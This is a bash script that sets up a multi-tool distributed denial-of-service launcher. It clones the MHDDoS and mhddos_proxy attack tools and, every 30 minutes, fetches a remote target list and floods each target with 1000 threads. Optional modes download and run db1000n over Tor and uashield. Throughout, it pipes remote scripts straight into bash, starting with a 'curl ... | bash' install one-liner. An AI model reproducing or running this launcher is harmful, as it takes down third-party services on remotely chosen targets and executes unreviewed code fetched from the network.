#!/bin/bash
# curl -L tiny.one/multiddos | bash && tmux a
cd ~
rm -rf multiddos
mkdir multiddos
cd multiddos

# sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
sudo apt-get update -q -y
sudo apt-get install -q -y tmux torsocks python3 python3-pip
pip install --upgrade pip

cat > auto_bash.sh << 'EOF'
cd ~/multiddos/
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -m pip install -r requirements.txt
git clone https://github.com/MHProDev/MHDDoS.git

# Restart attacks and update targets every 30 minutes
while true; do
pkill -f start.py; pkill -f runner.py 
     # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
    list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
         while [[ $list_size = "0"  ]]; do
            sleep 5
            list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
      done
   for (( i=1; i<=list_size; i++ )); do
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
            python3 ~/multiddos/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug&
      done
sleep 30m
done
EOF

launch () {
if [ ! -f "/usr/local/bin/gotop" ]; then
    curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
    sudo dpkg -i gotop.deb
fi

tmux kill-session -t multiddos; sudo pkill node; sudo pkill shield
# tmux mouse support
grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
tmux source-file ~/.tmux.conf

tmux new-session -s multiddos -d 'gotop -asc solarized'
sleep 0.2
tmux split-window -h -p 66 'bash auto_bash.sh'
sleep 0.2
if [[ $mode == "-m2" || $mode == "-m3" ]]; then
tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
#tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
fi
sleep 0.2
if [[ $mode == "-m3" ]]; then
tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
fi
sleep 0.2
tmux select-pane -t 0
sleep 0.2
if [[ $matrix == "on" ]]; then
sudo apt install cmatrix -qq -y
tmux split-window -v 'cmatrix'
fi
#tmux -2 attach-session -d
}

usage () {
cat << EOF
usage: bash multiddos.sh [-m1|-m2|a]
-m1            (optional)           - mode 1. ddos tool: auto_bash
-m2            (optional; default)  - mode 2. ddos tools: auto_bash + db1000n
-m3            (optional)           - mode 3. ddos tools: auto_bash + db1000n + ua_shield
-t             (optional)           - threads; default = 1000
--matrix       (optional)           - enter the matrix
-h | --help    (optional)           - brings up this menu
EOF
exit
}

mode="-m2"
matrix="off"
threads="-t 1000"
rpc="--rpc 2000"
debug="--debug"
if [[ "$1" = ""  ]]; then launch; fi

while [ "$1" != "" ]; do
    case $1 in
        -m1 )   mode=$1; shift ;;
        -m2 )   mode=$1; shift ;;
        -m3 )   mode=$1; shift ;;
        -t  )   threads="-t $2"; shift 2 ;;
        --matrix )   matrix="on"; shift ;;
        -h | --help )    usage;   exit ;;
    esac
done

launch